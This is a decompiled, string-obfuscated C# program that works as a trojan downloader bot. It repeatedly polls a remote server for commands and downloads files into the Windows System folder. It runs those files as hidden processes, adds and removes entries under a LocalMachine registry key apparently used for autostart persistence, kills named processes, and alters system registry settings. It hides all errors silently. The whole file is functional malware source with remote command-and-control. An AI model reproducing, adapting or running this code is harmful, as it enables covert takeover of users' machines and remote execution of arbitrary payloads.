using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace ns0;

internal class Class0
{
	private bool bool_0;

	private string string_0 = GClass0.smethod_0("5");

	private bool bool_1 = true;

	private int int_0;

	private string string_1 = GClass0.smethod_0("");

	private string string_2;

	private string[] string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private static void Main()
	{
		new Class0();
	}

	public void method_0()
	{
		try
		{
			string_2 = Environment.GetFolderPath(Environment.SpecialFolder.System) + GClass0.smethod_0("]");
			if (bool_0)
			{
				Console.WriteLine(GClass0.smethod_0("\\Œɔ\u0340ѓԩزݢࡩॼ\u0a7a୨ౡ\u0d4d\u0e65ཥ\u106cᅢቴጿᐤᔮᘯ\u173f") + string_2 + GClass0.smethod_0("?įȬ"));
			}
		}
		catch (Exception)
		{
		}
	}

	public Class0()
	{
		method_7();
		while (true)
		{
			try
			{
				while (true)
				{
					method_0();
					string_1 = GClass0.smethod_0("Cőɖ\u0321") + string_0;
					if (bool_0)
					{
						Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
					}
					while (bool_1)
					{
						method_1();
						Thread.Sleep(3000);
					}
					if (bool_0)
					{
						Console.WriteLine(GClass0.smethod_0("\u0015ėț\u0315Йԓ؟\u0711\u081dए\u0a03\u0b0d\u0c01ഋง༉စᄙሆ፣ᑱᕯ᙮ᜁᡣ᥆\u1a5d᭑᱙ᴻṞὖ⁖⅒∺⌵⑇╟♗❔⡀⥆⩀⭊Ⱜⴺ⸪⽄ぁㅉ㉓㍑㑁㕐㘢㝚") + int_0 + GClass0.smethod_0("\\"));
					}
					int_0++;
					Thread.Sleep(60000);
					bool_1 = true;
				}
			}
			catch (Exception ex)
			{
				if (bool_0)
				{
					Console.WriteLine(GClass0.smethod_0("9Ķȷ\u0335уն\u0670ݲ\u087c०੫\u0b63౸ഫ\u0e6f\u0f7bၺᅨቴጿᐤᔮᘯ\u173f") + ex.ToString() + GClass0.smethod_0("?įȬ"));
				}
			}
		}
	}

	public void method_1()
	{
		if (!(string_1 != GClass0.smethod_0("")))
		{
			return;
		}
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(GClass0.smethod_0("Lŗɖ\u0351К\u0530رܤ\u082dवਨ\u0b29యഹว༬ဦᄽሪጩᐿᕧᙥ\u177eᠢ\u197b\u1a62᭹\u1c37ᵷṧί\u2065Ⅾ≱⌼") + string_1);
			httpWebRequest.Method = GClass0.smethod_0("DŇɕ");
			httpWebRequest.Timeout = 15000;
			httpWebRequest.UserAgent = GClass0.smethod_0("\u0016ĵȣ\u0331лԺشݻࡦॼ\u0a61୰౧ങฤ༢\u102fᄥሾጻᑼᕦᘐ\u177fᡣᤕᨨᬮᱛᵑṊ\u1f4f‛ⅴ≭⌘␂┘☄✏⠓⥗⩟⬝ⱺ\u2d7d⸖⼌すㅜ㈓㌙㐉㔞㘋㜕㠍㤓㨈㬀㱘㵻㹾㽷䁴䄵䈡䌬䐠䔧䘭䜣䠠䤧䨢䬰䱉䵧乿佩偭入剱匧吵唨嘵圪堳夬娰");
			WebResponse response = httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
			string text = streamReader.ReadToEnd();
			streamReader.Close();
			response.Close();
			string_1 = GClass0.smethod_0("");
			text = text.TrimEnd(new char[0]);
			string[] array = text.Split(new char[1] { '\n' });
			for (int i = 0; i < array.Length; i++)
			{
				string text2 = array[i];
				string text3 = GClass0.smethod_0("");
				if (text2.IndexOf(GClass0.smethod_0(")")) > 0 && text2.IndexOf(GClass0.smethod_0("(")) > 0)
				{
					string[] array2 = text2.Split(new char[1] { '(' });
					string[] array3 = array2[1].Split(new char[1] { ')' });
					text3 = array3[0];
					text2 = array2[0] + array3[1];
				}
				string string_ = text2.Substring(0, 3);
				string string_2 = GClass0.smethod_0("");
				if (text2.Length >= 4)
				{
					string_2 = text2.Substring(4);
				}
				if (text3 == GClass0.smethod_0("") || text3 == string_6)
				{
					method_3(string_, string_2);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_2(string string_7, string string_8)
	{
		try
		{
			if (bool_0)
			{
				Console.WriteLine(GClass0.smethod_0("Qőɑ\u0347і\u0530٫ݡ\u087a\u0962੧\u0b65౨൬\u0e6eཨ\u1062ᄤሮጯᐿ") + string_7 + GClass0.smethod_0("6Ĥȥ\u0327Ѳժؤܮ\u082f\u093f") + string_8 + GClass0.smethod_0("?įȬ"));
			}
			WebClient webClient = new WebClient();
			webClient.DownloadFile(string_7, string_8);
		}
		catch (Exception)
		{
		}
	}

	public void method_3(string string_7, string string_8)
	{
		try
		{
			string key;
			if ((key = string_7) != null)
			{
				if (_003CPrivateImplementationDetails_003E_007BC916F129_002D929A_002D4870_002D9DD4_002DC8525F20F214_007D.dictionary_0 == null)
				{
					_003CPrivateImplementationDetails_003E_007BC916F129_002D929A_002D4870_002D9DD4_002DC8525F20F214_007D.dictionary_0 = new Dictionary<string, int>(7)
					{
						{
							GClass0.smethod_0("BŁɊ"),
							0
						},
						{
							GClass0.smethod_0("Gŕɍ"),
							1
						},
						{
							GClass0.smethod_0("Fōɒ"),
							2
						},
						{
							GClass0.smethod_0("FŚɄ"),
							3
						},
						{
							GClass0.smethod_0("Qŏɗ"),
							4
						},
						{
							GClass0.smethod_0("FŌɅ"),
							5
						},
						{
							GClass0.smethod_0("Hŋɍ"),
							6
						}
					};
				}
				if (_003CPrivateImplementationDetails_003E_007BC916F129_002D929A_002D4870_002D9DD4_002DC8525F20F214_007D.dictionary_0.TryGetValue(key, out var value))
				{
					switch (value)
					{
					case 0:
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("?ľȽ") + string_7 + GClass0.smethod_0("!") + string_8);
						}
						string_6 = string_8;
						return;
					case 1:
					{
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("?ľȽ") + string_7 + GClass0.smethod_0("!") + string_8);
						}
						string_3 = string_8.Split(new char[1] { ' ' });
						string_4 = string_3[0];
						string_5 = string_3[1];
						string text5 = string_3[2];
						string text6 = GClass0.smethod_0("");
						if (string_3.Length > 3)
						{
							text6 = string_3[3];
						}
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("PŖɐ\u0344їԵخݫࡥ१੯୧౩൪\u0e63\u0f3fဤᄮሯጿ") + string_4 + GClass0.smethod_0("?įȬ"));
						}
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("\\Œɔ\u0340ѓԩزݶ\u087f८\u0a62\u0b41\u0c63൨\u0e6b\u0f7dၡᅨቨጿᐤᔮᘯ\u173f") + string_5 + GClass0.smethod_0("?įȬ"));
						}
						if (!File.Exists(string_2 + string_5))
						{
							if (text5 == GClass0.smethod_0("jŧɩ\u0368Ѡէٷݭ\u0873"))
							{
								if (bool_0)
								{
									Console.WriteLine(GClass0.smethod_0("fŤɢ\u034aљԧؼݼ\u0875॰੶୰శൡ\u0e7b༳ၶᅾቧ፡ᑢᕢ᙭ᝯᠪ\u196f\u1a61\u1b6bᱣᴿḤἮ\u202fℿ") + string_4 + GClass0.smethod_0("6Ĥȥ\u0327Ѳժؤܮ\u082f\u093f") + string_2 + string_5 + GClass0.smethod_0("?įȬ"));
								}
								method_2(string_4, string_2 + string_5);
								string_1 = GClass0.smethod_0("Bŉɀ\u0323эՊ");
								if (bool_0)
								{
									Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
								}
								method_1();
							}
							else if (text5 == GClass0.smethod_0("hŪɶ\u036eѣխ"))
							{
								if (bool_0)
								{
									Console.WriteLine(GClass0.smethod_0("fŤɢ\u034aљԧؼݼ\u0875॰੶୰శൡ\u0e7b༳ၶᅾቧ፡ᑢᕢ᙭ᝯᠪ\u196f\u1a61\u1b6bᱣᴿḤἮ\u202fℿ") + string_4 + GClass0.smethod_0("6Ĥȥ\u0327Ѳժؤܮ\u082f\u093f") + string_2 + string_5 + GClass0.smethod_0("?įȬ"));
								}
								method_2(string_4, string_2 + string_5);
								string_1 = GClass0.smethod_0("BŁɊ\u0323эՊ");
								if (bool_0)
								{
									Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
								}
								method_1();
							}
							else if (text5 == GClass0.smethod_0("dũɨʹѯէٹ"))
							{
								if (bool_0)
								{
									Console.WriteLine(GClass0.smethod_0("fŤɢ\u034aљԧؼݼ\u0875॰੶୰శൡ\u0e7b༳ၶᅾቧ፡ᑢᕢ᙭ᝯᠪ\u196f\u1a61\u1b6bᱣᴿḤἮ\u202fℿ") + string_4 + GClass0.smethod_0("6Ĥȥ\u0327Ѳժؤܮ\u082f\u093f") + text6 + string_5 + GClass0.smethod_0("?įȬ"));
								}
								method_2(string_4, text6 + string_5);
								string_1 = GClass0.smethod_0("BŁɊ\u0323эՊ");
								if (bool_0)
								{
									Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
								}
								method_1();
							}
							return;
						}
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("\u0004Šɦ\u0360Ѵէإ\u073eࡩॴੲ୩హൾ\u0e7e\u0f7aၰᄴቶ፪ᑸᕣᙻ\u177dᠭᥭ\u1a67᭸ᱬᵩṣ\u1f7f\u203fℤ∮⌯\u243f") + string_2 + string_5 + GClass0.smethod_0("$ĺȻ\u0339дդٷ\u0731ࡔ\u094a\u0a42\u0b48ౘൎสའၼᄧቈፊᑓᔢᘣᜠ"));
						}
						string text7 = string_5.Substring(0, string_5.Length - 4);
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("\\Œɔ\u0340ѓԳٵݾ\u0879ॡ੩ଭ౸\u0d64สརၡᅫቪጿᐤᔮᘯ\u173f") + text7 + GClass0.smethod_0("?įȬ"));
						}
						method_8(text7);
						string_1 = GClass0.smethod_0("MŌɈ\u0323эՊ");
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
						}
						method_1();
						File.Delete(string_2 + string_5);
						method_2(string_4, string_2 + string_5);
						if (text5 == GClass0.smethod_0("jŧɩ\u0368Ѡէٷݭ\u0873"))
						{
							string_1 = GClass0.smethod_0("Bŉɀ\u0323эՊ");
							if (bool_0)
							{
								Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
							}
							method_1();
						}
						else
						{
							string_1 = GClass0.smethod_0("BŁɊ\u0323эՊ");
							if (bool_0)
							{
								Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
							}
							method_1();
						}
						return;
					}
					case 2:
					{
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("?ľȽ") + string_7 + GClass0.smethod_0("!") + string_8);
						}
						string_3 = string_8.Split(new char[1] { ' ' });
						string_4 = string_3[0];
						string text4 = string_3[1];
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("PŖɐ\u0344їԵخݫࡥ१੯୧౩൪\u0e63\u0f3fဤᄮሯጿ") + string_4 + GClass0.smethod_0("?įȬ"));
						}
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("Yřə\u034fўԢطݤ\u0870ॳ\u0a7aୡ\u0c65\u0d62\u0e76ཋ\u1063ᅸቹ፳ᑇᕩᙪᝣᠿ\u1924ᨮᬯ᰿") + text4 + GClass0.smethod_0("?įȬ"));
						}
						method_5(string_2 + string_4, text4);
						string_1 = GClass0.smethod_0("CŊɗ\u0323эՊ");
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
						}
						method_1();
						return;
					}
					case 3:
					{
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("?ľȽ") + string_7 + GClass0.smethod_0("!") + string_8);
						}
						string_3 = string_8.Split(new char[1] { ' ' });
						string text8 = string_3[0];
						string text9 = GClass0.smethod_0("");
						if (string_3.Length > 1)
						{
							text9 = string_3[1];
						}
						string text10 = ((text9 == GClass0.smethod_0("") || text9 == null) ? string_2 : text9);
						if (!File.Exists(text10 + text8))
						{
							return;
						}
						try
						{
							if (bool_0)
							{
								Console.WriteLine(GClass0.smethod_0("ZŘɞ\u034eѝԹٻݥ\u0873ॴ\u0a60\u0b7a౼൶ะ\u0f7bၦᅨሬ፥ᑯᕾᘨ\u1777ᡴᥪ\u1a67᭦ᱱᵲ"));
							}
							Process process = new Process();
							process.StartInfo.WorkingDirectory = text10;
							process.StartInfo.FileName = text10 + text8;
							process.StartInfo.Arguments = GClass0.smethod_0("");
							process.StartInfo.CreateNoWindow = true;
							process.Start();
							if (bool_0)
							{
								Console.WriteLine(GClass0.smethod_0("]ŝɕ\u0343ђԴٽݷࡦर\u0a7f\u0b7c\u0c62൯\u0e6e\u0f79ၺᄨቴ፲ᑤᕶᙷᝧᡥ"));
							}
							string_1 = GClass0.smethod_0("CŝɁ\u0323эՊ");
							if (bool_0)
							{
								Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
							}
							method_1();
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					case 4:
					{
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("?ľȽ") + string_7 + GClass0.smethod_0("!") + string_8);
						}
						string_4 = string_8;
						string text = method_6(string_4);
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("Wŗɓ\u0345шԮ٫ݥࡧ९੧୩౪\u0d63฿༤\u102eᄯሿ") + string_4 + GClass0.smethod_0("?įȬ"));
						}
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("Sœɗ\u0341єԲ٥ݿ\u085d५\u0a60\u0b63౽൯๏ཡ\u106bᅣሿጤᐮᔯᘿ") + text + GClass0.smethod_0("?įȬ"));
						}
						string text2 = GClass0.smethod_0("");
						if (text != null && text != GClass0.smethod_0(""))
						{
							if (bool_0)
							{
								Console.WriteLine(GClass0.smethod_0("bŠɦͶѥԁهݰ\u0877ॳ\u0a7b\u0b3b౮൶\u0e38ཅၓᅔቘ\u135fᑋᔱᙢᝪᡣᥢ\u1a7a\u1b6e\u1c2aᵽṠὢ…Ⅳ≭⍯⑧╲"));
							}
							string text3 = text.Split(new char[1] { '\\' })[^1];
							text2 = text3.Substring(0, text3.Length - 4);
							if (bool_0)
							{
								Console.WriteLine(GClass0.smethod_0("ZŘɞ\u034eѝԹ٬ݸࡄ॰\u0a79\u0b7c\u0c64൴เ\u0f7dၡᅮቩ፸ᑹᕇᙩᝪᡣ\u193fᨤᬮ\u1c2fᴿ") + text2 + GClass0.smethod_0("?įȬ"));
							}
							method_8(text2);
							Thread.Sleep(10000);
							method_4(string_4);
							File.Delete(text);
						}
						string_1 = GClass0.smethod_0("Uŋɓ\u0324ьՉء") + text2;
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
						}
						method_1();
						return;
					}
					case 5:
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("?ľȽ") + string_7 + GClass0.smethod_0("!") + string_8);
						}
						bool_1 = false;
						return;
					case 6:
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("?ľȽ") + string_7 + GClass0.smethod_0("!") + string_8);
						}
						method_8(string_8);
						string_1 = GClass0.smethod_0("MŌɈ\u0323эՊ");
						if (bool_0)
						{
							Console.WriteLine(GClass0.smethod_0("=ļȿ") + string_1);
						}
						method_1();
						return;
					}
				}
			}
			if (bool_0)
			{
				Console.WriteLine(GClass0.smethod_0("1İȷ\u035fчՃى\u0749ࡒ\u094a\u0a3f\u0b3eఽ") + string_7 + GClass0.smethod_0("!") + string_8);
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_4(string string_7)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"));
		if (registryKey == null)
		{
			return;
		}
		try
		{
			registryKey.DeleteValue(string_7);
		}
		catch (Exception)
		{
		}
		finally
		{
			registryKey.Close();
		}
	}

	public void method_5(string string_7, string string_8)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"));
		if (registryKey == null)
		{
			return;
		}
		try
		{
			registryKey.SetValue(string_8, string_7);
		}
		catch (Exception)
		{
		}
		finally
		{
			registryKey.Close();
		}
	}

	public string method_6(string string_7)
	{
		string result = GClass0.smethod_0("");
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(GClass0.smethod_0("~ţɭ;Ѿթٵݣ\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"));
		if (registryKey != null)
		{
			try
			{
				result = Convert.ToString(registryKey.GetValue(string_7));
				return result;
			}
			catch (Exception)
			{
				return result;
			}
			finally
			{
				registryKey.Close();
			}
		}
		return result;
	}

	public void method_7()
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(GClass0.smethod_0("lőɛ\u0348ь՛\u064bݝ\u086bॻੜ\u0b57\u0c41൝โཟ၉ᅚቱ፻ᑂᕄᙍᝇᡐᥕ\u1a79᭧᱖ᵐṓὅⁱⅪ≋⍹⑩╩♰❷⡹⥊⩅⭻Ɀ\u2d7b\u2e72⽹なㅽ㉑㍍㑸㕹㙦㝫㡮㥧㩱㭭㱬㵬㹲"));
		if (registryKey != null)
		{
			try
			{
				registryKey.SetValue(GClass0.smethod_0("\\Šɹ\u035fѥո١ݏࡡ५\u0a63\u0b51౽൳\u0e67\u0f72"), GClass0.smethod_0(" Ũɴ\u036eбԧپݥ\u0875\u093eਪ୮\u0c71൨"));
				registryKey.SetValue(GClass0.smethod_0("WŷɷͱѺբٹ\u074aࡢ०੬ଡ଼౾൶\u0e60བ\u106aᅱቪ"), 6152);
			}
			catch (Exception)
			{
			}
			finally
			{
				registryKey.Close();
			}
		}
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(GClass0.smethod_0("mŒɚ\u034fэ\u0558يݒࡪॸ\u0a5d\u0b50\u0c40൞ใཀ၈ᅙተ፼ᑃᕇᙌᝈᡑᥖ\u1a78᭠᱗ᵓṒὺ⁰Ⅹ≊⍾⑨╪♱❸⡸⥉⩄⭼Ȿ\u2d78\u2e73⽦にㅾ㉐㍊㑾㕽㙩㝤㡮㥨㩡㭭㱶㵲"));
		if (registryKey2 != null)
		{
			try
			{
				registryKey2.SetValue(GClass0.smethod_0("@ųɧ\u0375ѕա٣ݩࡂ।੯୧\u0c75൫\u0e64\u0f70\u106aᅭቯ"), 1);
			}
			catch (Exception)
			{
			}
			finally
			{
				registryKey2.Close();
			}
		}
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey(GClass0.smethod_0("lőɛ\u0348ь՛\u064bݝ\u086bॻੜ\u0b57\u0c41൝โཟ၉ᅚቱ፻ᑂᕄᙍᝇᡐᥕ\u1a79᭧᱖ᵐṓὅⁱⅪ≋⍹⑩╩♰❷⡹⥊⩅⭻Ɀ\u2d7b\u2e72⽹なㅽ㉑㍍㑸㕹㙦㝫㡮㥧㩱㭭㱬㵬㹲"));
		if (registryKey3 != null)
		{
			try
			{
				registryKey3.SetValue(GClass0.smethod_0("\\Šɹ\u035fѥո١ݏࡡ५\u0a63\u0b51౽൳\u0e67\u0f72"), GClass0.smethod_0(" Ũɴ\u036eбԧپݥ\u0875\u093eਪ୮\u0c71൨"));
				registryKey3.SetValue(GClass0.smethod_0("WŷɷͱѺբٹ\u074aࡢ०੬ଡ଼౾൶\u0e60བ\u106aᅱቪ"), 6152);
			}
			catch (Exception)
			{
			}
			finally
			{
				registryKey3.Close();
			}
		}
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(GClass0.smethod_0("mŒɚ\u034fэ\u0558يݒࡪॸ\u0a5d\u0b50\u0c40൞ใཀ၈ᅙተ፼ᑃᕇᙌᝈᡑᥖ\u1a78᭠᱗ᵓṒὺ⁰Ⅹ≊⍾⑨╪♱❸⡸⥉⩄⭼Ȿ\u2d78\u2e73⽦にㅾ㉐㍊㑾㕽㙩㝤㡮㥨㩡㭭㱶㵲"));
		if (registryKey4 == null)
		{
			return;
		}
		try
		{
			registryKey4.SetValue(GClass0.smethod_0("@ųɧ\u0375ѕա٣ݩࡂ।੯୧\u0c75൫\u0e64\u0f70\u106aᅭቯ"), 1);
		}
		catch (Exception)
		{
		}
		finally
		{
			registryKey4.Close();
		}
	}

	public bool method_8(string string_7)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName == string_7)
			{
				try
				{
					process.Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		return true;
	}
}
